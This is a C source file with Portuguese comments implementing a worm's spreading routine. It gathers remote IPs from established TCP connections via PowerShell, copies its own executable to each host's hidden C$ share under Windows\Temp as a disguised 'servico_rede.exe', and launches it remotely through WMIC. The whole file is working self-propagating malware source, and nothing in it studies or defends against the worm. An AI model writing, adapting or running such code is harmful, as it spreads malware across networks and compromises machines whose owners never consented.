#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void propagar_na_rede(const char *meu_executavel) {
    printf("\n--- Buscando Alvos e Tentando Propagacao ---\n");
    
    // Comando PowerShell: Lista apenas os IPs remotos de conexões estabelecidas
    const char *comando_ps = "powershell.exe -Command \"(Get-NetTCPConnection -State Established).RemoteAddress | Select-Object -Unique\"";
    
    // Usamos popen para que o C consiga LER a saída do terminal (os IPs)
    FILE *fp = popen(comando_ps, "r");
    if (fp == NULL) {
        printf("Erro ao executar o PowerShell para buscar IPs.\n");
        return;
    }

    char ip_destino[64];
    
    // Lê cada linha (cada IP) retornada pelo PowerShell
    while (fgets(ip_destino, sizeof(ip_destino), fp) != NULL) {
        // Remove a quebra de linha do final da string
        ip_destino[strcspn(ip_destino, "\r\n")] = 0;

        // Filtra IPs inválidos ou locais
        if (strlen(ip_destino) > 7 && strcmp(ip_destino, "127.0.0.1") != 0 && strcmp(ip_destino, "0.0.0.0") != 0) {
            printf("\n[+] Alvo encontrado: %s\n", ip_destino);
            
            char comando_copia[512];
            char comando_execucao[512];

            // 1. Tenta copiar o próprio executável para a unidade C$ (compartilhamento oculto do Windows)
            // Salvaremos na pasta Temp do destino.
            snprintf(comando_copia, sizeof(comando_copia), "copy \"%s\" \\\\%s\\C$\\Windows\\Temp\\servico_rede.exe", meu_executavel, ip_destino);
            printf("Copiando para o alvo...\n");
            int res_copia = system(comando_copia);

            // Se a cópia for bem-sucedida, tenta executar remotamente
            if (res_copia == 0) {
                printf("Copia concluida. Tentando execucao remota...\n");
                
                // 2. Usa o WMIC para iniciar o processo na máquina remota de forma invisível
                snprintf(comando_execucao, sizeof(comando_execucao), "wmic /node:%s process call create \"C:\\Windows\\Temp\\servico_rede.exe\"", ip_destino);
                system(comando_execucao);
                
                printf("Comando de execucao enviado para %s.\n", ip_destino);
            } else {
                printf("Falha ao acessar a maquina %s (Permissao negada ou caminho inacessivel).\n", ip_destino);
            }
        }
    }
    pclose(fp);
}

int main(int argc, char *argv[]) {
    // argv[0] contem o caminho do proprio arquivo executavel rodando no momento
    const char *meu_executavel = argv[0];

    printf("Iniciando processo local: %s\n", meu_executavel);

    // Inicia a rotina de mapear a rede e se espalhar
    propagar_na_rede(meu_executavel);

    return 0;
}